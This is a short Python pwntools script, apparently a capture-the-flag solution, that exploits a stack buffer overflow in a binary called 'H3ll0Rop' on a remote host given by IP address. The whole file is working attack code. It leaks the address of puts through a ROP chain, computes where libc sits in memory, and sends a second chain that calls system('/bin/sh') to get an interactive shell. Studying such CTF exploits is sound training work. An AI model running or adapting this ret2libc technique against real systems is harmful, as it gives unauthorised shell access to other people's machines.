from pwn import *

#io = process('./H3ll0Rop')
io = remote('39.107.75.148',5041)
libc = ELF('./libc-2.23.so')
elf = ELF('./H3ll0Rop')
context.log_level = 'debug'
#raw_input()

puts_got = elf.got['puts']
puts_plt = elf.plt['puts']
call_vuln = 0x4006e1
pop_rdi = 0x400753

payload = b'\x61'*0x58 + b'\x00'*8
payload += b'\x62'*0x8 # rbp
payload += p64(pop_rdi)
payload += p64(puts_got)
payload += p64(puts_plt)
payload += p64(call_vuln)


io.recvuntil(b'me???\n')
io.send(payload)

io.recvuntil(b'\x0a\x0a')
puts_addr = io.recvuntil(b'\x0a', drop=True)
#print(str(puts_addr))
puts_addr = puts_addr.ljust(0x8, b'\x00')
#print(str(puts_addr))
puts_addr = u64(puts_addr)
#print(hex(puts_addr))

libc.address = puts_addr - libc.symbols['puts']
#print(hex(libc.address))

binsh_addr = libc.address + 0x18ce57 
system_addr = libc.symbols['system']
ret_addr = 0x400506

payload2 = b'\x61'*0x58 + b'\x00'*8
payload2 += b'\x62'*0x8 # rbp
payload2 += p64(pop_rdi)
payload2 += p64(binsh_addr)
payload2 += p64(ret_addr)
payload2 += p64(system_addr)

io.send(payload2)

io.interactive()
